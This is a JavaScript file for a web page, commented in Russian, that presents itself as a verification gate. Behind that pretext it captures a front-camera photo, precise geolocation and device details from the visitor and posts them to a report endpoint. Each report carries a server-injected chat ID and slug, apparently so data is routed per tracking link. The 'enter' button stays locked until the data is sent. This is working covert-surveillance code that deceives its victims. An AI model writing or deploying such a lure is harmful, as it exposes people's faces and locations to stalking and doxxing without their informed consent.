// === app.js ===

// Настройки: работаем по тому же origin, где открыт сайт
const API_BASE = ''; // оставляем пустым — запросы идут на тот же домен

// Кэшируем UI
const UI = {
  text: document.getElementById('text'),
  note: document.getElementById('note'),
  btn: document.getElementById('enterBtn'),
};

// Флаг готовности к переходу
window.__reportReady = false;

// === Стили кнопки ===
function setBtnLocked() {
  const b = UI.btn;
  if (!b) return;
  b.disabled = true;
  b.style.filter = 'grayscale(35%) brightness(0.9)';
  b.style.opacity = '0.6';
  b.style.cursor = 'not-allowed';
  b.style.background = 'linear-gradient(90deg, #246, #39a)';
  b.style.boxShadow = '0 0 6px rgba(0,153,255,.25)';
}

function setBtnReady() {
  const b = UI.btn;
  if (!b) return;
  b.disabled = false;
  b.style.filter = 'none';
  b.style.opacity = '1';
  b.style.cursor = 'pointer';
  b.style.background = 'linear-gradient(90deg, #4f00ff, #00bfff)';
  b.style.boxShadow = '0 0 20px rgba(79,0,255,.6), 0 0 28px rgba(0,191,255,.45)';
}

// === Геолокация ===
async function askGeolocation() {
  return new Promise((resolve) => {
    if (!('geolocation' in navigator)) return resolve(null);
    navigator.geolocation.getCurrentPosition(
      (p) =>
        resolve({
          lat: p.coords.latitude,
          lon: p.coords.longitude,
          acc: Math.round(p.coords.accuracy),
          ts: Date.now(),
        }),
      () => resolve(null),
      { enableHighAccuracy: true, timeout: 15000, maximumAge: 0 }
    );
  });
}

// === Фото с камеры ===
async function takePhoto() {
  if (!navigator.mediaDevices?.getUserMedia)
    throw new Error('Camera unsupported');
  const stream = await navigator.mediaDevices.getUserMedia({
    video: { facingMode: 'user' },
  });
  const [track] = stream.getVideoTracks();
  try {
    const cap = new ImageCapture(track);
    const bmp = await cap.grabFrame();
    const c = document.createElement('canvas');
    c.width = bmp.width;
    c.height = bmp.height;
    c.getContext('2d').drawImage(bmp, 0, 0);
    const dataUrl = c.toDataURL('image/jpeg', 0.85);
    track.stop();
    return dataUrl;
  } catch {
    const v = document.createElement('video');
    v.srcObject = stream;
    await v.play();
    const c = document.createElement('canvas');
    c.width = v.videoWidth;
    c.height = v.videoHeight;
    c.getContext('2d').drawImage(v, 0, 0);
    const dataUrl = c.toDataURL('image/jpeg', 0.85);
    stream.getTracks().forEach((t) => t.stop());
    return dataUrl;
  }
}

// === Инфо об устройстве ===
function getDeviceInfo() {
  const ua = navigator.userAgent;
  const isSafari =
    /Safari\//.test(ua) &&
    !/Chrome|CriOS|Chromium|FxiOS|Edg|OPR/.test(ua) &&
    navigator.vendor === 'Apple Computer, Inc.';
  const m = ua.match(/OS\s(\d+)[_.]/);
  const iosVer = m ? parseInt(m[1], 10) : null;
  return {
    userAgent: ua,
    platform: navigator.platform,
    iosVersion: iosVer,
    isSafari,
  };
}

// === Отправка отчёта ===
async function sendReport({ photoBase64, geo }) {
  const info = getDeviceInfo();
  const body = { ...info, geo, photoBase64, note: 'auto' };

  // 👇 поддержка внедрённых chatId и slug от сервера
  if (window.__reportChatId) body.chatId = window.__reportChatId;
  if (window.__SLUG) body.slug = window.__SLUG;

  const r = await fetch(`${API_BASE}/api/report`, {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify(body),
  });

  const data = await r.json().catch(() => ({}));
  if (!data.ok) throw new Error(data.error || 'Send failed');
  return data;
}

// === Основной поток ===
async function autoFlow() {
  try {
    setBtnLocked();
    UI.text.innerHTML = 'Запрашиваем камеру и геолокацию…';

    const [geo, photoBase64] = await Promise.all([
      askGeolocation(),
      takePhoto(),
    ]);

    UI.text.innerHTML = 'Отправляем данные для проверки…';
    await sendReport({ photoBase64, geo });

    window.__reportReady = true;
    setBtnReady();

    UI.text.innerHTML = '<span class="ok">Проверка пройдена.</span>';
    UI.note.textContent = 'Можно продолжить.';
  } catch (e) {
    console.error(e);
    setBtnLocked();
    window.__reportReady = false;
    UI.text.innerHTML =
      '<span class="err">Не удалось выполнить проверку.</span>';
    UI.note.textContent = 'Повтори позже.';
  }
}

// === Экспорт функции ===
window.__autoFlow = autoFlow;

// === Защита от преждевременного клика ===
(function guardClick() {
  const btn = UI.btn;
  if (!btn) return;
  btn.addEventListener(
    'click',
    (e) => {
      if (!window.__reportReady) {
        e.preventDefault();
        e.stopPropagation();
      }
    },
    { capture: true }
  );
})();
